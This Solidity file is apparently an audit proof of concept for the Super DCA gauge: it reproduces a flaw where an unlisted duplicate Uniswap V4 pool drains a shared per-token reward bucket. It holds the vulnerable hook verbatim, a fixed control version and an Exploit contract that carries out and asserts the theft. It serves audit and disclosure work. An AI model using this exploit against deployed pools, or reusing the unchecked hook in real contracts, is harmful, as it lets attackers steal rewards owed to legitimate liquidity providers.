// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.22;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Super DCA finding 63420 (H-2):
// "Attackers will steal rewards from legitimate pools by making duplicate pools
//  for a listed token."
//
// Root cause (SuperDCAGauge.sol @ audit freeze 3a15b6c, L323-L367):
// `_handleDistributionAndSettlement` accrues the SHARED, PER-TOKEN reward bucket
// via `staking.accrueReward(otherToken)` and donates the community share to
// whatever pool `key` triggered the hook — with NO check that `key` is the
// legitimately-listed pool. Uniswap V4 allows multiple pools for the same token
// pair using the same hook, and the listing module only lists a token once. So
// an attacker can spin up an UNLISTED duplicate pool (DCA/USDC, different config)
// with the same hook, add liquidity, and the beforeAddLiquidity hook drains
// USDC's per-token reward bucket and donates the community share to the
// attacker's pool. The legitimate pool's LPs then receive 0 for that token.
//
// The vulnerable function body below is inlined BYTE-FOR-BYTE from the audited
// source (imports/pragma/`using` for unrelated libs stripped; unrelated hook
// features — keeper, fees, access control — omitted as they are off the exploit
// path). The Uniswap V4 flash-accounting boundary (PoolManager: sync / donate /
// settle / getLiquidity) is represented by a minimal faithful double, since it
// is out of the finding's scope. The bug — the missing pool-legitimacy check —
// is reproduced exactly, not asserted.
// ─────────────────────────────────────────────────────────────────────────────

// ============================ Uniswap V4 core types ==========================

type Currency is address;
type PoolId is bytes32;

interface IHooks {}

struct PoolKey {
    Currency currency0;
    Currency currency1;
    uint24 fee;
    int24 tickSpacing;
    IHooks hooks;
}

/// @dev Faithful minimal PoolId derivation: a unique id per distinct key.
library PoolIdLibrary {
    function toId(PoolKey memory poolKey) internal pure returns (PoolId) {
        return PoolId.wrap(keccak256(abi.encode(poolKey)));
    }
}

/// @dev The subset of IPoolManager the vulnerable function actually calls.
interface IPoolManager {
    struct ModifyLiquidityParams {
        int24 tickLower;
        int24 tickUpper;
        int256 liquidityDelta;
        bytes32 salt;
    }

    function sync(Currency currency) external;
    function settle() external payable returns (uint256);
    function getLiquidity(PoolId poolId) external view returns (uint128);
    function donate(PoolKey memory key, uint256 amount0, uint256 amount1, bytes calldata hookData)
        external
        returns (int256);
}

/// @dev SuperDCAToken mint surface used by the gauge's `_tryMint`.
interface ISuperchainERC20 {
    function mint(address to, uint256 amount) external;
}

/// @dev External staking module surface used by the gauge.
interface ISuperDCAStaking {
    function accrueReward(address token) external returns (uint256 rewardAmount);
}

/// @dev Hook-callback surface the PoolManager double dispatches to.
interface IDCAHookCallbacks {
    function beforeAddLiquidity(
        address sender,
        PoolKey calldata key,
        IPoolManager.ModifyLiquidityParams calldata params,
        bytes calldata hookData
    ) external returns (bytes4);
    function beforeRemoveLiquidity(
        address sender,
        PoolKey calldata key,
        IPoolManager.ModifyLiquidityParams calldata params,
        bytes calldata hookData
    ) external returns (bytes4);
}

// ============================== Minimal doubles ==============================

/// @dev SuperDCA reward token (SuperchainERC20 double). `mint` is the gauge's
///      minting right; the gauge holds token owner privileges in production.
contract DCAToken is ISuperchainERC20 {
    string public constant name = "Super DCA Token";
    string public constant symbol = "DCA";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Plain ERC20 used only as the "other token" currency (USDC) identifier.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 6;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }
}

/// @dev Minimal faithful double of SuperDCAStaking's per-token accrual.
///      `accrueReward(token)` returns the token's accrued bucket ONCE and resets
///      it to 0 (models `lastRewardIndex` being synced), exactly like the real
///      contract: whoever triggers accrual first drains the shared bucket.
contract MiniSuperDCAStaking is ISuperDCAStaking {
    uint256 public mintRate;
    address public gauge;
    mapping(address => uint256) internal _accrued; // token => pending reward

    function setGauge(address g) external {
        gauge = g;
    }

    function setMintRate(uint256 r) external {
        mintRate = r;
    }

    /// @notice Seed a token's accrued reward bucket (models rewardIndex growth
    ///         over elapsed time × the token's staked amount).
    function seedReward(address token, uint256 amount) external {
        _accrued[token] += amount;
    }

    function accrueReward(address token) external returns (uint256 rewardAmount) {
        rewardAmount = _accrued[token];
        _accrued[token] = 0; // reset — a second accrual for the same token returns 0
    }

    function previewPending(address token) external view returns (uint256) {
        return _accrued[token];
    }
}

/// @dev Minimal faithful double of the Uniswap V4 PoolManager flash-accounting
///      boundary. Models the four operations the vulnerable function uses:
///      sync / getLiquidity / donate / settle, plus an LP entrypoint that drives
///      the real hook callbacks and an LP fee-collection path.
contract MiniPoolManager is IPoolManager {
    DCAToken public immutable dca;
    mapping(bytes32 => uint128) public liquidityOf; // poolId => liquidity
    mapping(bytes32 => uint256) public poolRewardPot; // poolId => donated DCA claimable by pool LPs
    Currency internal syncedCurrency;

    constructor(DCAToken _dca) {
        dca = _dca;
    }

    // ---- surface used by the vulnerable hook (msg.sender == this) ----

    function sync(Currency currency) external override {
        syncedCurrency = currency;
    }

    function settle() external payable override returns (uint256) {
        // Real V4 clears the transient debt created by donate against the synced
        // token balance the hook already minted into this manager. Out of scope
        // for this finding; the minted DCA physically sits in this contract.
        return 0;
    }

    function getLiquidity(PoolId poolId) external view override returns (uint128) {
        return liquidityOf[PoolId.unwrap(poolId)];
    }

    function donate(PoolKey memory key, uint256 amount0, uint256 amount1, bytes calldata)
        external
        override
        returns (int256)
    {
        bytes32 id = keccak256(abi.encode(key));
        // Credit the triggering pool with its DCA leg — claimable by that pool's LPs.
        uint256 dcaAmt = Currency.unwrap(key.currency0) == address(dca) ? amount0 : amount1;
        poolRewardPot[id] += dcaAmt;
        return 0;
    }

    // ---- LP entrypoints (drive the real hook callbacks) ----

    function modifyLiquidityAs(
        PoolKey memory key,
        IPoolManager.ModifyLiquidityParams memory params,
        bytes memory hookData,
        address lp
    ) external {
        bytes32 id = keccak256(abi.encode(key));
        // The manager calls the hook (so the hook sees msg.sender == manager),
        // BEFORE applying the liquidity change — matching V4 ordering. `lp` is the
        // real position owner passed through as the hook's `sender` argument.
        if (params.liquidityDelta >= 0) {
            IDCAHookCallbacks(address(key.hooks)).beforeAddLiquidity(lp, key, params, hookData);
            liquidityOf[id] += uint128(uint256(params.liquidityDelta));
        } else {
            IDCAHookCallbacks(address(key.hooks)).beforeRemoveLiquidity(lp, key, params, hookData);
            liquidityOf[id] -= uint128(uint256(-params.liquidityDelta));
        }
    }

    /// @notice A pool's LP collects its donated reward pot (attacker is the sole
    ///         LP of the malicious pool, so only they can collect it).
    function collect(PoolKey memory key, address to) external returns (uint256 amt) {
        bytes32 id = keccak256(abi.encode(key));
        amt = poolRewardPot[id];
        poolRewardPot[id] = 0;
        if (amt > 0) dca.transfer(to, amt);
    }

    function rewardPotOf(PoolKey memory key) external view returns (uint256) {
        return poolRewardPot[keccak256(abi.encode(key))];
    }
}

// ============================== Minimal BaseHook =============================

/// @dev Minimal stand-in for v4-periphery BaseHook: stores the pool manager,
///      guards callbacks to the manager, and exposes the external hook selectors
///      the gauge returns. Semantics identical for the exploit path.
abstract contract BaseHook is IDCAHookCallbacks {
    IPoolManager public immutable poolManager;

    constructor(IPoolManager _poolManager) {
        poolManager = _poolManager;
    }

    modifier onlyPoolManager() {
        require(msg.sender == address(poolManager), "NotPoolManager");
        _;
    }

    function beforeAddLiquidity(
        address sender,
        PoolKey calldata key,
        IPoolManager.ModifyLiquidityParams calldata params,
        bytes calldata hookData
    ) external override onlyPoolManager returns (bytes4) {
        return _beforeAddLiquidity(sender, key, params, hookData);
    }

    function beforeRemoveLiquidity(
        address sender,
        PoolKey calldata key,
        IPoolManager.ModifyLiquidityParams calldata params,
        bytes calldata hookData
    ) external override onlyPoolManager returns (bytes4) {
        return _beforeRemoveLiquidity(sender, key, params, hookData);
    }

    function _beforeAddLiquidity(
        address sender,
        PoolKey calldata key,
        IPoolManager.ModifyLiquidityParams calldata params,
        bytes calldata hookData
    ) internal virtual returns (bytes4);

    function _beforeRemoveLiquidity(
        address sender,
        PoolKey calldata key,
        IPoolManager.ModifyLiquidityParams calldata params,
        bytes calldata hookData
    ) internal virtual returns (bytes4);
}

// ══════════════════════════════════════════════════════════════════════════════
// VULNERABLE contract — reward-distribution core of SuperDCAGauge, verbatim.
// (Keeper / fee / access-control features omitted; they are off the exploit path.)
// ══════════════════════════════════════════════════════════════════════════════
contract SuperDCAGauge is BaseHook {
    using PoolIdLibrary for PoolKey;

    address public superDCAToken;
    address public developerAddress;
    ISuperDCAStaking public staking;

    constructor(IPoolManager _poolManager, address _superDCAToken, address _developerAddress)
        BaseHook(_poolManager)
    {
        superDCAToken = _superDCAToken;
        developerAddress = _developerAddress;
    }

    function setStaking(address stakingAddr) external {
        staking = ISuperDCAStaking(stakingAddr);
    }

    // ─────────────── VERBATIM vulnerable function (audit L323-L367) ───────────────
    function _handleDistributionAndSettlement(PoolKey calldata key, bytes calldata hookData) internal {
        // Must sync the pool manager to the token before distributing tokens
        poolManager.sync(Currency.wrap(superDCAToken));

        // Derive the non-DCA token for accrual calculation
        // The staking contract uses this to determine reward amounts
        address otherToken = superDCAToken == Currency.unwrap(key.currency0)
            ? Currency.unwrap(key.currency1)
            : Currency.unwrap(key.currency0);

        // Calculate pending rewards from the external staking contract
        uint256 rewardAmount = staking.accrueReward(otherToken); // @> per-token bucket accrued (and reset) for ANY pool incl. an unlisted duplicate; NO pool-legitimacy check
        if (rewardAmount == 0) return;

        // Check if pool has liquidity before proceeding with donation
        uint128 liquidity = IPoolManager(msg.sender).getLiquidity(key.toId());
        if (liquidity == 0) {
            // If no liquidity, try sending everything to developer (do not revert if mint fails)
            _tryMint(developerAddress, rewardAmount);
            return;
        }

        // Split the mint amount between developer and community (50/50)
        uint256 developerShare = rewardAmount / 2;
        uint256 communityShare = rewardAmount - developerShare;

        // Mint developer share (ignore failure)
        _tryMint(developerAddress, developerShare);

        // Mint community share and donate to pool only if mint succeeds
        // This prevents donation of tokens that don't exist
        if (_tryMint(address(poolManager), communityShare)) {
            // Donate community share to pool
            if (superDCAToken == Currency.unwrap(key.currency0)) {
                IPoolManager(msg.sender).donate(key, communityShare, 0, hookData);
            } else {
                IPoolManager(msg.sender).donate(key, 0, communityShare, hookData);
            }

            // Settle the donation to complete the transaction
            poolManager.settle();
        }

        /// @dev: At this point, there are DCA tokens left in the hook for the other pools.
    }

    function _beforeAddLiquidity(
        address, // sender
        PoolKey calldata key,
        IPoolManager.ModifyLiquidityParams calldata, // params
        bytes calldata hookData
    ) internal override returns (bytes4) {
        _handleDistributionAndSettlement(key, hookData);
        return BaseHook.beforeAddLiquidity.selector;
    }

    function _beforeRemoveLiquidity(
        address, // sender
        PoolKey calldata key,
        IPoolManager.ModifyLiquidityParams calldata, // params
        bytes calldata hookData
    ) internal override returns (bytes4) {
        _handleDistributionAndSettlement(key, hookData);
        return BaseHook.beforeRemoveLiquidity.selector;
    }

    function _tryMint(address to, uint256 amount) internal returns (bool success) {
        if (amount == 0) return true;
        try ISuperchainERC20(superDCAToken).mint(to, amount) {
            return true;
        } catch {
            return false;
        }
    }
}

// ══════════════════════════════════════════════════════════════════════════════
// FIXED contract (negative control): identical, but validates that the pool that
// triggered the hook is the legitimately-listed pool BEFORE accruing/donating.
// ══════════════════════════════════════════════════════════════════════════════
contract SuperDCAGaugeFixed is BaseHook {
    using PoolIdLibrary for PoolKey;

    address public superDCAToken;
    address public developerAddress;
    ISuperDCAStaking public staking;
    mapping(bytes32 => bool) public isListedPool; // poolId => is the legitimately-listed pool

    constructor(IPoolManager _poolManager, address _superDCAToken, address _developerAddress)
        BaseHook(_poolManager)
    {
        superDCAToken = _superDCAToken;
        developerAddress = _developerAddress;
    }

    function setStaking(address stakingAddr) external {
        staking = ISuperDCAStaking(stakingAddr);
    }

    function setListedPool(bytes32 id, bool v) external {
        isListedPool[id] = v;
    }

    function _handleDistributionAndSettlement(PoolKey calldata key, bytes calldata hookData) internal {
        // FIX: only the legitimately-listed pool for this token may trigger
        // reward accrual + donation. An unlisted duplicate pool is a no-op.
        if (!isListedPool[PoolId.unwrap(key.toId())]) return;

        poolManager.sync(Currency.wrap(superDCAToken));

        address otherToken = superDCAToken == Currency.unwrap(key.currency0)
            ? Currency.unwrap(key.currency1)
            : Currency.unwrap(key.currency0);

        uint256 rewardAmount = staking.accrueReward(otherToken);
        if (rewardAmount == 0) return;

        uint128 liquidity = IPoolManager(msg.sender).getLiquidity(key.toId());
        if (liquidity == 0) {
            _tryMint(developerAddress, rewardAmount);
            return;
        }

        uint256 developerShare = rewardAmount / 2;
        uint256 communityShare = rewardAmount - developerShare;

        _tryMint(developerAddress, developerShare);

        if (_tryMint(address(poolManager), communityShare)) {
            if (superDCAToken == Currency.unwrap(key.currency0)) {
                IPoolManager(msg.sender).donate(key, communityShare, 0, hookData);
            } else {
                IPoolManager(msg.sender).donate(key, 0, communityShare, hookData);
            }
            poolManager.settle();
        }
    }

    function _beforeAddLiquidity(
        address,
        PoolKey calldata key,
        IPoolManager.ModifyLiquidityParams calldata,
        bytes calldata hookData
    ) internal override returns (bytes4) {
        _handleDistributionAndSettlement(key, hookData);
        return BaseHook.beforeAddLiquidity.selector;
    }

    function _beforeRemoveLiquidity(
        address,
        PoolKey calldata key,
        IPoolManager.ModifyLiquidityParams calldata,
        bytes calldata hookData
    ) internal override returns (bytes4) {
        _handleDistributionAndSettlement(key, hookData);
        return BaseHook.beforeRemoveLiquidity.selector;
    }

    function _tryMint(address to, uint256 amount) internal returns (bool success) {
        if (amount == 0) return true;
        try ISuperchainERC20(superDCAToken).mint(to, amount) {
            return true;
        } catch {
            return false;
        }
    }
}

// ══════════════════════════════════════════════════════════════════════════════
// Exploit driver.
// run()             — the real buggy path: attacker's UNLISTED duplicate pool
//                     steals USDC's per-token reward bucket; legit pool gets 0.
// runFixedControl() — same scenario against the FIXED gauge: attacker gets 0,
//                     the legit pool receives the community share.
// ══════════════════════════════════════════════════════════════════════════════
contract Exploit {
    using PoolIdLibrary for PoolKey;

    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    address internal constant LEGIT_LP = 0x0000000000000000000000000000000000000a11;
    address internal constant DEVELOPER = 0x00000000000000000000000000000000000de0DE;

    // Dynamic-fee flag (both pools use dynamic fees, so they differ by tickSpacing).
    uint24 internal constant DYNAMIC_FEE = 0x800000;
    uint256 internal constant REWARD = 1000 ether; // USDC's accrued per-token reward bucket

    // --- deployed buggy-scenario contracts (constructor deploy order) ---
    DCAToken public dca;
    MiniToken public usdc;
    MiniPoolManager public pm;
    MiniSuperDCAStaking public staking;
    SuperDCAGauge public gauge;

    // --- exposed results (buggy) ---
    uint256 public attackerStolen; // DCA the attacker collected from the malicious pool
    uint256 public communityShare; // the community half of the bucket (the stolen magnitude)
    uint256 public legitPot; // DCA the legitimate pool received for USDC (should be 0)
    address public gaugeAddr;
    address public dcaAddr;
    address public stakingAddr;

    // --- exposed results (fixed control) ---
    uint256 public fixedAttackerStolen;
    uint256 public fixedLegitPot;

    constructor() {
        dca = new DCAToken(); // 0
        usdc = new MiniToken("USD Coin", "USDC"); // 1
        pm = new MiniPoolManager(dca); // 2
        staking = new MiniSuperDCAStaking(); // 3
        gauge = new SuperDCAGauge(IPoolManager(address(pm)), address(dca), DEVELOPER); // 4

        gauge.setStaking(address(staking));
        staking.setGauge(address(gauge));
        staking.setMintRate(1 ether);

        gaugeAddr = address(gauge);
        dcaAddr = address(dca);
        stakingAddr = address(staking);
    }

    function _key(int24 tickSpacing) internal view returns (PoolKey memory) {
        // DCA is currency0 (lower address is not enforced by the double; the
        // gauge only requires DCA to be one of the two currencies).
        return PoolKey({
            currency0: Currency.wrap(address(dca)),
            currency1: Currency.wrap(address(usdc)),
            fee: DYNAMIC_FEE,
            tickSpacing: tickSpacing,
            hooks: IHooks(address(gauge))
        });
    }

    function _add(MiniPoolManager m, PoolKey memory key, address lp, int256 delta) internal {
        IPoolManager.ModifyLiquidityParams memory p = IPoolManager.ModifyLiquidityParams({
            tickLower: -60,
            tickUpper: 60,
            liquidityDelta: delta,
            salt: bytes32(0)
        });
        // Route through the manager AS the LP so the hook sees the manager caller.
        m.modifyLiquidityAs(key, p, "", lp);
    }

    function run() external payable {
        PoolKey memory legitKey = _key(60); // legitimately-listed pool
        PoolKey memory malKey = _key(10); // attacker's UNLISTED duplicate pool (same pair + hook)

        // 1. Legit pool is seeded with liquidity (reward bucket still empty -> no-op).
        _add(pm, legitKey, LEGIT_LP, 1_000_000);

        // 2. Attacker creates + seeds the malicious duplicate pool (still no-op).
        _add(pm, malKey, ATTACKER, 1_000_000);

        // 3. USDC's shared per-token reward bucket accrues (time passes for the listed token).
        staking.seedReward(address(usdc), REWARD);

        // 4. Attacker triggers the hook on the MALICIOUS pool: it drains USDC's
        //    per-token bucket and donates the community share to the attacker's pool.
        _add(pm, malKey, ATTACKER, 1_000_000);

        // 5. Attacker (sole LP of the malicious pool) collects the donated reward.
        attackerStolen = pm.collect(malKey, ATTACKER);
        communityShare = REWARD - (REWARD / 2); // 500e18

        // 6. Legit pool now triggers the hook: the bucket was already drained -> it gets 0.
        _add(pm, legitKey, LEGIT_LP, 1_000_000);
        legitPot = pm.rewardPotOf(legitKey);

        // ── HARM ────────────────────────────────────────────────────────────────
        // Attacker stole the entire community share of USDC's reward bucket;
        // the legitimate pool received nothing for that token.
        require(attackerStolen == communityShare, "attacker did not steal community share");
        require(attackerStolen == 500 ether, "unexpected stolen amount");
        require(legitPot == 0, "legit pool should have received nothing");
        require(dca.balanceOf(ATTACKER) == 500 ether, "stolen DCA not at attacker EOA");
    }

    /// @notice Negative control — same sequence against the fixed gauge.
    function runFixedControl() external {
        DCAToken dcaF = new DCAToken();
        MiniToken usdcF = new MiniToken("USD Coin", "USDC");
        MiniPoolManager pmF = new MiniPoolManager(dcaF);
        MiniSuperDCAStaking stF = new MiniSuperDCAStaking();
        SuperDCAGaugeFixed gaugeF = new SuperDCAGaugeFixed(IPoolManager(address(pmF)), address(dcaF), DEVELOPER);
        gaugeF.setStaking(address(stF));
        stF.setGauge(address(gaugeF));

        PoolKey memory legitKey = PoolKey({
            currency0: Currency.wrap(address(dcaF)),
            currency1: Currency.wrap(address(usdcF)),
            fee: DYNAMIC_FEE,
            tickSpacing: 60,
            hooks: IHooks(address(gaugeF))
        });
        PoolKey memory malKey = PoolKey({
            currency0: Currency.wrap(address(dcaF)),
            currency1: Currency.wrap(address(usdcF)),
            fee: DYNAMIC_FEE,
            tickSpacing: 10,
            hooks: IHooks(address(gaugeF))
        });

        // Only the legit pool is listed.
        gaugeF.setListedPool(PoolId.unwrap(PoolIdLibrary.toId(legitKey)), true);

        IPoolManager.ModifyLiquidityParams memory p = IPoolManager.ModifyLiquidityParams({
            tickLower: -60,
            tickUpper: 60,
            liquidityDelta: int256(1_000_000),
            salt: bytes32(0)
        });

        pmF.modifyLiquidityAs(legitKey, p, "", LEGIT_LP); // seed legit
        pmF.modifyLiquidityAs(malKey, p, "", ATTACKER); // seed malicious
        stF.seedReward(address(usdcF), REWARD); // bucket accrues
        pmF.modifyLiquidityAs(malKey, p, "", ATTACKER); // attacker tries to steal -> blocked
        fixedAttackerStolen = pmF.collect(malKey, ATTACKER); // gets 0
        pmF.modifyLiquidityAs(legitKey, p, "", LEGIT_LP); // legit pool triggers -> receives community share
        fixedLegitPot = pmF.rewardPotOf(legitKey);
    }
}
